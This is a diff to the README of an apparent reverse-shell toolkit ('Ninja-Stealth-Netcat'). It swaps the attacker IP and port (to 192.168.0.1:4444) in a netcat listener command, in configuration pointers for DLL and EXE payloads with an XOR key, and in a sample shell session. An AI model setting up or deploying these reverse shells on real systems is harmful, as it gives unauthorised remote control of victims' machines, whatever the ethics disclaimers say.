@@ -47,8 +47,8 @@ This collection provides various reverse shell implementations designed for cybe
 
 ### 1. Set Up Listener
 ```bash
-# On attacker machine (192.168.0.28)
-nc -lvnp 44895
+# On attacker machine (192.168.0.1)
+nc -lvnp 4444
 ```
 
 ### 2. Choose Deployment Method
@@ -80,8 +80,8 @@ Ninja-Stealth-Netcat-Static.exe
 ## 🔧 Configuration
 
 Edit source files to configure:
-- **Target IP**: `192.168.0.28` (line ~140 in DLL, ~260 in EXE)
-- **Target Port**: `44895` (line ~141 in DLL, ~261 in EXE)
+- **Target IP**: `192.168.0.1` (line ~140 in DLL, ~260 in EXE)
+- **Target Port**: `4444` (line ~141 in DLL, ~261 in EXE)
 - **Encryption Key**: `0xAA` (line ~23 in DLL, ~19 in EXE)
 
 ## 🛡️ Security Features
@@ -107,7 +107,7 @@ Blocks dangerous commands including:
 
 ### Basic Command Execution
 ```bash
-# Connected to 192.168.0.28:44895
+# Connected to 192.168.0.1:4444
 whoami
 ipconfig
 dir
@@ -245,5 +245,6 @@ This toolkit is designed for educational and research purposes in cybersecurity.
 ---
 
 **🥷 Remember: With great ninja power comes great responsibility! Use these techniques ethically and legally for cybersecurity education and defense.**
+
 
 *For research and educational purposes only. Always operate within legal boundaries and authorized environments.*
